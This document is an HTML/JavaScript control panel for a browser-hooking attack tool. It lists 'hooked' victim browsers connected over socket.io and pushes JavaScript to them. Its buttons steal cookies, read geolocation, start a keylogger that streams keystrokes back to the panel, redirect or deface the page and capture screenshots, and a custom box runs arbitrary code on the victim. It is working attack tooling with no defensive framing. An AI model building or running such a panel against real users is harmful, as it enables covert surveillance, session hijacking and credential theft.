<!DOCTYPE html>
<html>
<head>
  <title>Control Panel</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 10px; }
    button { margin: 5px; padding: 6px 12px; }
    textarea { width: 100%; height: 60px; margin-top: 10px; }
    #output { background: #111; color: #0f0; padding: 10px; height: 150px; overflow-y: auto; }
    #screenshot { border: 1px solid #444; max-width: 100%; margin-top: 10px; }
  </style>
</head>
<body>
  <h2>Hooked Browsers</h2>
  <select id="target"></select>
  <ul id="clientList"></ul>

  <h3>Quick Commands</h3>
  <button onclick="sendCmd(`alert('Hello from Panel!')`)">Popup Alert</button>
  <button onclick="sendCmd(`document.body.style.background='red'`)">Red BG</button>
  <button onclick="sendCmd(`document.title='Hacked by Panel'`)">Change Title</button>
  <button onclick="sendCmd(`navigator.geolocation.getCurrentPosition(p=>socket.emit('output',{from:socket.id,result:JSON.stringify(p.coords)}))`)">Get Location</button>
  <button onclick="sendCmd(`document.cookie`)">Get Cookies</button>
  <button onclick="sendCmd(`window.location='https://google.com'`)">Redirect Google</button>
  <button onclick="sendCmd(`document.onkeydown=(e)=>{socket.emit('output',{from:socket.id,result:'Key:'+e.key});}`)">Start Keylogger</button>
  <button onclick="sendCmd(`/* webcam code here */`)">Webcam Snapshot</button>

  <button onclick="sendCmd(`takeScreenshot()`)">Screenshot</button>

  <h3>Custom Command</h3>
  <textarea id="customCode" placeholder="Type JavaScript here..."></textarea><br>
  <button onclick="runCustom()">Run Custom Code</button>

  <h3>Output Logs</h3>
  <pre id="output"></pre>

  <h3>Screenshot Output</h3>
  <img id="screenshot" src="">

  <script>
    const socket = io();
    socket.emit("register", { panel: true });

    function sendCmd(cmd) {
      let target = document.getElementById("target").value;
      socket.emit("command", { target, cmd });
    }

    function runCustom() {
      let code = document.getElementById("customCode").value;
      sendCmd(code);
    }

    socket.on("clients", (clients) => {
      let list = document.getElementById("clientList");
      let target = document.getElementById("target");
      list.innerHTML = "";
      target.innerHTML = "";
      for (let id in clients) {
        if (!clients[id].panel) {
          let li = document.createElement("li");
          li.textContent = id + " - " + clients[id].ua;
          list.appendChild(li);

          let opt = document.createElement("option");
          opt.value = id;
          opt.textContent = id;
          target.appendChild(opt);
        }
      }
    });

    socket.on("output", (data) => {
      document.getElementById("output").textContent += 
        `[${data.from}] ${data.result}\n`;
    });

    socket.on("screenshot", (data) => {
      document.getElementById("screenshot").src = data.img;
    });

    function sendCmd(cmd) {
  let target = document.getElementById("target").value;
  socket.emit("command", { target, cmd });
}

  </script>
</body>
</html>
